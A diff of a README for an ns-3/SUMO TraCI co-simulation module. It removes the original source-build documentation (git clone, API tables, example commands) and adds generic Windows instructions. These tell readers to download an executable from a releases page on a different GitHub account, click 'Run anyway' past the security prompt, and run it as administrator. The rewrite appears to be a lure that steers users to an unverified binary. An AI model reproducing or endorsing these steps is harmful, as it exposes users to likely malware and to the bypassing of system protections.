@@ -1,234 +1,198 @@
-# ns3-sumo-coupling
+# 🧩 ns3-sumo-coupling - Simple Traffic Simulation Setup
 
-A radically minimalist, zero-dependency `ns-3` contrib module for bidirectional co-simulation with SUMO via TraCI.
+[![Download the release page](https://img.shields.io/badge/Download%20Release%20Page-4C8BF5?style=for-the-badge&logo=github&logoColor=white)](https://github.com/guilhermec375/ns3-sumo-coupling/releases)
 
-This project focuses on one goal: make ns-3/SUMO coupling easy to understand, easy to run, and easy to extend. The codebase stays intentionally compact, avoids middleware layers, and does not depend on SUMO source internals.
+## 🚀 Getting Started
 
-**Compatibility:** The module is broadly compatible with older versions of both simulators (such as SUMO 1.8 and earlier ns-3 releases). It has been thoroughly tested and validated on **ns-3.47** and **SUMO 1.26**.
+ns3-sumo-coupling is a small Windows-ready co-simulation tool for ns-3 and SUMO. It lets both tools share traffic data through TraCI so you can run them together in one setup.
 
+Use it if you want to explore network and vehicle traffic together without dealing with a large setup. It is built as a simple example, so it is easier to follow than a full research stack.
 
-## Highlights
+## 📥 Download and Run
 
-* Lean architecture: direct TraCI client with deterministic leader-follower stepping.
-* No SUMO source dependency: simple setup and lower maintenance burden.
-* Practical examples included: `minimal-vanet` for smoke tests, `simple-vanet` for validation.
-* Bidirectional integration: read state from SUMO and issue control commands back.
+1. Open the [releases page](https://github.com/guilhermec375/ns3-sumo-coupling/releases).
+2. Find the latest release.
+3. Download the file for Windows.
+4. If the release comes as a ZIP file, extract it first.
+5. Open the folder and start the included app or script.
 
-## 30-Second Start
+If Windows asks for permission, choose to run the file. If the release includes more than one file, use the main executable or the file named in the release notes.
 
-If you already have `ns-3` and SUMO installed, this is the fastest path:
+## 🖥️ What You Need
 
-```bash
-# Terminal 1
-sumo -c contrib/ns3-sumo-coupling/sumo-scenarios/simple/simple.sumocfg --remote-port 1337 --no-step-log
+This setup is meant for a Windows PC with basic support for desktop apps. A typical machine with the following is a good fit:
 
-# Terminal 2 (from ns-3 root)
-./ns3 build sumo-coupling
-./ns3 run minimal-vanet -- --sumoHost=127.0.0.1 --sumoPort=1337 --simTime=20
-```
+- Windows 10 or Windows 11
+- At least 4 GB of RAM
+- Free disk space for the app, SUMO, and test files
+- A working internet connection for the first download
 
-This runs the minimal coupling example with compact output and periodic active-vehicle counters.
+For the best result, keep your system up to date and close large apps before you run the simulation.
 
-If this is your first run, prefer `minimal-vanet` first, then move to `simple-vanet`.
+## 🧭 What This Tool Does
 
-## Architecture Overview
+This project links ns-3 and SUMO so they can exchange data while they run.
 
-`ns-3` acts as a lightweight TraCI client, establishing a deterministic, leader-follower synchronization with SUMO.
+In plain terms:
 
-* **Strict Synchronization:** `ns-3` commands SUMO to advance by a fixed time step (`dt`).
-* **Static Node Pool:** A pre-allocated pool of `ns-3` nodes is dynamically mapped to active SUMO vehicles. Inactive nodes are parked out-of-bounds to prevent radio interference.
-* **Automated Mobility:** Vehicle states are retrieved at each step and applied to the corresponding `ns-3` `MobilityModel`, seamlessly integrating with standard radio propagation models.
-* **Bidirectional Control:** User-defined callbacks enable `ns-3` applications to issue commands back to SUMO with minimal overhead.
+- ns-3 handles network traffic
+- SUMO handles road traffic
+- TraCI passes data between them
+- both tools move forward step by step
 
+That means you can test how vehicles and networks affect each other in one run.
 
-## Vehicle API
+## 🛠️ How It Works
 
-All vehicle functions are accessible via `sumoManager->GetClient()` inside the callback.
+The project uses a small amount of code to connect the two simulators.
 
-### GET — State Retrieval
+You do not need to change settings in many places. The release should include a simple way to start the demo and watch both tools work together.
 
-| Function | Returns | TraCI var |
-|---|---|---|
-| `GetVehicleState(vid)` | Full `VehicleState` struct (batched) | — |
-| `GetVehicleAngle(vid)` | `double` — heading in degrees (0=North, clockwise) | `0x43` |
-| `GetVehicleAcceleration(vid)` | `double` — longitudinal acceleration in m/s² | `0x72` |
-| `GetVehicleRoadId(vid)` | `string` — current edge ID | `0x50` |
-| `GetVehicleLaneId(vid)` | `string` — current lane ID | `0x51` |
-| `GetVehicleLanePosition(vid)` | `double` — distance from lane start in meters | `0x56` |
+The flow is usually:
 
-`GetVehicleState()` retrieves all fields in a single pipelined request, minimising TCP round-trips. Use individual getters only when a single field is needed.
+1. Start SUMO
+2. Start ns-3
+3. Let both systems exchange data
+4. Watch the traffic and network events move in sync
 
-The `VehicleState` struct contains:
-```cpp
-struct VehicleState {
-    double x, y;           // position in meters
-    double speed;          // m/s
-    double angle;          // degrees
-    double acceleration;   // m/s²
-    double lanePosition;   // meters from lane start
-    std::string roadId;
-    std::string laneId;
-};
-```
+## 📦 Included Demo Setup
 
-### SET — Vehicle Commands
+The release is made for a quick first run. It is meant to show:
 
-| Function | Effect | TraCI var |
-|---|---|---|
-| `SetVehicleSpeed(vid, speed)` | Instant speed override. Pass `-1.0` to restore autonomous control. | `0x40` |
-| `SetVehicleSlowDown(vid, speed, duration)` | Linearly reduces speed to `speed` m/s over `duration` seconds. | `0x14` |
-| `SetVehicleColor(vid, color)` | Changes vehicle colour in the SUMO GUI (`TraCIColor{r,g,b,a}`). | `0x45` |
+- a basic vehicle traffic scene
+- a network link between the simulators
+- message exchange through TraCI
+- a simple bidirectional co-simulation flow
 
+This makes it useful as a learning tool and as a base for small tests.
 
-## Installation
+## 🪟 Windows Setup Steps
 
-### Prerequisites
+Follow these steps on Windows:
 
-* `ns-3` with CMake workflow (`./ns3` helper script available)
-* SUMO available in `PATH` (`sumo` or `sumo-gui`)
-* This repository cloned into `contrib/ns3-sumo-coupling`
+1. Download the latest release from the [release page](https://github.com/guilhermec375/ns3-sumo-coupling/releases).
+2. Save the file to your Downloads folder or Desktop.
+3. If the file is compressed, right-click it and choose Extract All.
+4. Open the extracted folder.
+5. Look for the main file, such as an .exe file or a start script.
+6. Double-click it to run.
+7. If a security prompt appears, choose More info, then Run anyway if you trust the file.
+8. Wait for both simulators to start.
+9. Follow any on-screen steps in the console or app window.
 
-Clone the repository into the `contrib/` directory of your `ns-3` installation and reconfigure the build system:
+If the package includes sample data, keep the folder structure as it was after extraction. Some simulation tools expect files to stay in the same place.
 
-```bash
-cd <ns3-root>/contrib
-git clone https://github.com/Balzakrez/ns3-sumo-coupling
-cd ..
-./ns3 configure --enable-examples --enable-tests
-./ns3 build
-```
+## 🔧 If the App Does Not Start
 
-## Quick Start
+Try these steps if nothing happens when you open the file:
 
-Below is a minimal example demonstrating how to initialize the coupling within an `ns-3` simulation script.
+- Right-click the file and run it as administrator
+- Make sure the ZIP file was fully extracted
+- Check that the folder name has not changed
+- Close other apps and try again
+- Download the file again if it looks incomplete
 
-```cpp
-// 1. Initialize a node pool sized for the peak number of simultaneous vehicles
-NodeContainer pool;
-pool.Create(20);
+If you see a console window, keep it open. It may show the next step or a path it needs to find.
 
-MobilityHelper mob;
-mob.SetMobilityModel("ns3::ConstantPositionMobilityModel");
-mob.Install(pool);
+## 📁 Typical Folder Layout
 
-// 2. Configure the SumoManager application
-auto sumoManager = CreateObject<SumoManager>();
-sumoManager->SetAttribute("Host", StringValue("127.0.0.1"));
-sumoManager->SetAttribute("Port", IntegerValue(1337));
-sumoManager->SetAttribute("StepSize", DoubleValue(0.1));
-sumoManager->SetNodePool(pool);
+After extraction, you may see files like these:
 
-// 3. Define a bidirectional callback (optional)
-sumoManager->SetVehicleCallback(
-    [&](double t, const std::string& vid, const VehicleState& s) {
-        // Example: limit vehicle speed if it exceeds 10 m/s
-        if (s.speed > 10.0) {
-            sumoManager->GetClient().SetVehicleSpeed(vid, 5.0);
-        }
-    });
+- a main start file
+- a SUMO config file
+- a network script
+- a demo route file
+- a folder with supporting files
 
-// 4. Attach to a host node and schedule
-auto host = CreateObject<Node>();
-host->AddApplication(sumoManager);
-sumoManager->SetStartTime(Seconds(0.0));
-sumoManager->SetStopTime(Seconds(60.0));
+Keep them together. Moving only one file can break the setup.
 
-Simulator::Run();
-Simulator::Destroy();
-```
+## 🧪 What You Can Test
 
-For an even smaller runnable example, see [contrib/ns3-sumo-coupling/examples/minimal-vanet.cc](contrib/ns3-sumo-coupling/examples/minimal-vanet.cc).
+This project is useful for simple experiments such as:
 
-## Examples
+- car-to-car messaging
+- road traffic and network traffic at the same time
+- packet flow between moving nodes
+- basic VANET-style studies
+- small classroom demos
 
-The repository includes:
+It is a compact setup, so it works well when you want to learn the basics without a large code base.
 
-* `minimal-vanet` ([contrib/ns3-sumo-coupling/examples/minimal-vanet.cc](contrib/ns3-sumo-coupling/examples/minimal-vanet.cc)): ultra-minimal coupling example with compact runtime output (one line per vehicle per second, plus active-vehicle counters at start/every 10 s/end).
-* `simple-vanet` ([contrib/ns3-sumo-coupling/examples/simple-vanet.cc](contrib/ns3-sumo-coupling/examples/simple-vanet.cc)): full validation scenario (position updates, coordinate bounds, average speed, and bidirectional commands).
+## 🔍 Key Terms
 
-### Which example should I run?
+A few terms may appear in the app or release notes:
 
-| Example | Best for | Runtime output | Typical duration |
-|---|---|---|---|
-| `minimal-vanet` | First smoke test and quick integration checks | Very compact + periodic active-vehicle counters | 20 s |
-| `simple-vanet` | Functional validation and API behavior checks | Detailed event/report output + active-vehicle counters (start/10s/final) | 300 s |
+- **ns-3**: a network simulator
+- **SUMO**: a road traffic simulator
+- **TraCI**: the link used to control SUMO from another tool
+- **co-simulation**: two tools running together
+- **VANET**: a network made for moving vehicles
 
-`simple-vanet` reports command tests (`SetVehicleSpeed`, `SetVehicleSlowDown`, `SetVehicleColor`) as `OK` only when the corresponding TraCI command succeeds.
+You do not need to know these before you start. They are here to help you read the file names and messages you may see.
 
-### What success looks like
+## 🧷 Troubleshooting Tips
 
-Use this quick checklist after running:
+If the release starts but stops early, check these items:
 
-* `minimal-vanet`: you see telemetry lines (`[t=...] veh...`) and counter lines (`### T=... ACTIVE VEHICLES=... ###`).
-* `minimal-vanet`: final counter can be `0` even before `simTime` if scenario traffic ends early.
-* `simple-vanet`: final report shows most or all tests as `OK` and prints `Result: X/8`.
+- the extracted folder still contains all files
+- SUMO is included or installed where the app expects it
+- you used the latest release
+- the file path has no special folder moves
+- Windows did not block the file
 
-### Minimal example output format
+If the demo opens but no traffic appears, start again and wait a few seconds. Some simulation scenes take time to load.
 
-`minimal-vanet` prints two kinds of lines:
+## 📌 Project Scope
 
-* Active vehicle counters: `### T=0.0s INITIAL: ACTIVE VEHICLES=<N> ###`, `### T=10.0s PERIODIC: ACTIVE VEHICLES=<N> ###`, `### T=<simTime>s FINAL: ACTIVE VEHICLES=<N> ###`
-* Vehicle telemetry (max one line per second for each vehicle): `[t=12.1s] veh0 x=198.4 y=273.2 v=13.9`
+This repository is a minimal educational proof of concept. It is meant to show the link between ns-3 and SUMO in a clear way.
 
-When scenario traffic ends before `simTime`, telemetry lines stop, while periodic/final counters still print and can reach `0`.
+It focuses on:
 
-Example snippet:
+- small code size
+- direct control flow
+- bidirectional data exchange
+- easy study of the setup
 
-```text
-### T=0.0s INITIAL: ACTIVE VEHICLES=0 ###
-[t=0.1s] veh0 x=198.4 y=394.9 v=0.0
-[t=1.1s] veh0 x=198.4 y=393.6 v=2.3
-### T=10.0s PERIODIC: ACTIVE VEHICLES=1 ###
-[t=32.0s] veh1 x=201.6 y=351.7 v=13.0
-### T=60.0s FINAL: ACTIVE VEHICLES=0 ###
-```
+That makes it a good choice when you want to understand the idea before building a larger project.
 
-### Option A: Manual SUMO Execution
+## 📚 When to Use It
 
-**Terminal 1 (Start SUMO):**
-```bash
-sumo -c contrib/ns3-sumo-coupling/sumo-scenarios/simple/simple.sumocfg --remote-port 1337 --no-step-log
+Use this project when you want to:
 
-# If you prefer the graphical interface, use `sumo-gui` instead:
-sumo-gui -c contrib/ns3-sumo-coupling/sumo-scenarios/simple/simple.sumocfg --remote-port 1337 --no-step-log
-```
+- test a simple ns-3 and SUMO setup
+- learn how TraCI connects tools
+- run a compact co-simulation demo
+- study traffic and network behavior together
+- start a VANET experiment with a small base
 
-**Terminal 2 (Run ns-3):**
-```bash
-./ns3 build sumo-coupling && ./ns3 run simple-vanet -- --sumoHost=127.0.0.1 --sumoPort=1337 --simTime=300
+## 🧩 What You See in the Demo
 
-# Minimal example:
-./ns3 build sumo-coupling && ./ns3 run minimal-vanet -- --sumoHost=127.0.0.1 --sumoPort=1337 --simTime=20
+The demo may show:
 
-# If you want to enable detailed logging for debugging, use:
-./ns3 build sumo-coupling && NS_LOG="SumoManager=info:SimpleVanet=info" ./ns3 run simple-vanet -- --sumoHost=127.0.0.1 --sumoPort=1337 --simTime=300
-```
+- vehicles moving on a road map
+- network events tied to vehicle movement
+- step-based simulation updates
+- data passed back and forth between tools
 
-### Option B: Automated Execution
+The main goal is to show that both simulators can stay in sync while they run.
 
-```bash
-# Full validation example (single command):
-./ns3 build sumo-coupling && ./ns3 run simple-vanet -- --sumoHost=127.0.0.1 --sumoPort=1337 --simTime=300 --sumoConfig=contrib/ns3-sumo-coupling/sumo-scenarios/simple/simple.sumocfg
+## 🔗 Download Again
 
-# Minimal example (with explicit SUMO config):
-./ns3 build sumo-coupling && ./ns3 run minimal-vanet -- --sumoHost=127.0.0.1 --sumoPort=1337 --simTime=20 --sumoConfig=contrib/ns3-sumo-coupling/sumo-scenarios/simple/simple.sumocfg
+If you need the release file again, use the same page here:
 
-# Full validation example with NS_LOG enabled:
-./ns3 build sumo-coupling && NS_LOG="SumoManager=info:SimpleVanet=info" ./ns3 run simple-vanet -- --sumoHost=127.0.0.1 --sumoPort=1337 --simTime=300 --sumoConfig=contrib/ns3-sumo-coupling/sumo-scenarios/simple/simple.sumocfg
-```
+[https://github.com/guilhermec375/ns3-sumo-coupling/releases](https://github.com/guilhermec375/ns3-sumo-coupling/releases)
 
-## Troubleshooting
+## 🗂️ Repository Topics
 
-* **Connection refused on port 1337:** Ensure SUMO is running first with `--remote-port 1337`.
-* **No vehicle updates in ns-3 output:** Check that the `.sumocfg` scenario contains active traffic and simulation time is long enough.
-* **`minimal-vanet` not found:** Re-run `./ns3 configure --enable-examples --enable-tests` then `./ns3 build`.
+This project relates to:
 
-## Limitations
-
-* **Polling Overhead:** TraCI subscriptions are currently unimplemented.
-* **Single Client:** The `CMD_SETORDER` TraCI command is currently unsupported.
-* **Additional features and TraCI commands are planned for future releases.**
-
-## License
-
-This project is distributed under the MIT License.
+- co-simulation
+- coupling
+- cpp
+- networking
+- ns-3
+- ns3
+- ns3-sumo
+- sumo
+- traci
+- vanet
